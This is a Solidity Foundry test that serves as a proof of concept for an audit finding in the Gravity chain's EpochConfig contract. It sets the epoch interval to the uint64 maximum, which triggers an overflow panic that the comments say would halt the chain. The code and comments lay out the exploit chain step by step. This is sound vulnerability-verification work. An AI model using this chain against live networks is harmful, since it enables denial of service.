// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import { Test, stdError } from "forge-std/Test.sol";
import { EpochConfig } from "@gravity/runtime/EpochConfig.sol";
import { Timestamp } from "@gravity/runtime/Timestamp.sol";
import { Reconfiguration } from "@gravity/blocker/Reconfiguration.sol";
import { SystemAddresses } from "@gravity/foundation/SystemAddresses.sol";

/// @title PoC for gravity-audit issue #476 (OPEN + critical, live-bug verification)
/// @notice "EpochConfig.setForNextEpoch no upper bound — epochIntervalMicros = type(uint64).max
///          causes _canTransition() checked-arithmetic overflow → permanent chain halt"
///
/// @dev   Purpose of this PoC: prove that #476 is a *live* bug on `main` (not already fixed,
///        unlike #403 which turned out to be silently fixed). On main (a623eab) this test
///        should PASS — the expected overflow revert is observed, meaning the exploit is
///        reproducible end-to-end.
///
///        Exploit chain (condensed from issue body):
///        1. Governance → EpochConfig.setForNextEpoch(type(uint64).max)           // no upper-bound check
///        2. Reconfiguration → EpochConfig.applyPendingConfig()                   // epochInterval := uint64.max
///        3. BLOCK → Reconfiguration.checkAndStartTransition()                    // calls _canTransition()
///        4. _canTransition: `currentTime >= lastReconfigurationTime + epochInterval`
///           → nonzero + uint64.max → checked uint64 overflow → Panic(0x11) revert
contract POC_476 is Test {
    EpochConfig public epochConfig;
    Timestamp public timestamp;
    Reconfiguration public reconfiguration;

    address public alice = makeAddr("alice");

    uint64 constant EPOCH_INTERVAL = uint64(2 hours) * 1_000_000; // microseconds
    uint64 constant INITIAL_TIMESTAMP = 1_000_000_000_000_000;    // nonzero, needed to trigger overflow

    function setUp() public {
        // Deploy system contracts at their canonical SystemAddresses.
        vm.etch(SystemAddresses.TIMESTAMP, address(new Timestamp()).code);
        timestamp = Timestamp(SystemAddresses.TIMESTAMP);

        vm.etch(SystemAddresses.EPOCH_CONFIG, address(new EpochConfig()).code);
        epochConfig = EpochConfig(SystemAddresses.EPOCH_CONFIG);

        vm.etch(SystemAddresses.RECONFIGURATION, address(new Reconfiguration()).code);
        reconfiguration = Reconfiguration(SystemAddresses.RECONFIGURATION);

        // Timestamp must be nonzero BEFORE Reconfiguration.initialize() reads it,
        // so that lastReconfigurationTime gets a nonzero value (needed for the overflow
        // in _canTransition to actually occur — 0 + uint64.max does not overflow uint64).
        vm.prank(SystemAddresses.BLOCK);
        timestamp.updateGlobalTime(alice, INITIAL_TIMESTAMP);

        vm.prank(SystemAddresses.GENESIS);
        epochConfig.initialize(EPOCH_INTERVAL);

        vm.prank(SystemAddresses.GENESIS);
        reconfiguration.initialize();
    }

    function test_chainHaltExploitIsLive() public {
        // Sanity: default interval is the benign one.
        assertEq(epochConfig.epochIntervalMicros(), EPOCH_INTERVAL, "sanity: initial interval");
        assertEq(reconfiguration.lastReconfigurationTime(), INITIAL_TIMESTAMP, "sanity: last reconf time");

        // Step 1 — governance pushes a pathological epoch interval.
        // The bug: setForNextEpoch only rejects zero, no upper-bound validation.
        vm.prank(SystemAddresses.GOVERNANCE);
        epochConfig.setForNextEpoch(type(uint64).max);

        // Step 2 — reconfiguration applies the pending config (normally happens at epoch boundary).
        vm.prank(SystemAddresses.RECONFIGURATION);
        epochConfig.applyPendingConfig();
        assertEq(
            epochConfig.epochIntervalMicros(),
            type(uint64).max,
            "vuln confirmed: uint64.max accepted, no upper-bound check"
        );

        // Step 3 — on the next block, Blocker would invoke checkAndStartTransition.
        // Inside, _canTransition computes `lastReconfigurationTime + epochInterval` which
        // overflows uint64 and panics. We assert the panic to demonstrate the chain-halt
        // primitive: if this revert reaches Blocker.onBlockStart (which has no try/catch),
        // every block prologue will panic → chain halt.
        vm.expectRevert(stdError.arithmeticError);
        vm.prank(SystemAddresses.BLOCK);
        reconfiguration.checkAndStartTransition();
    }
}
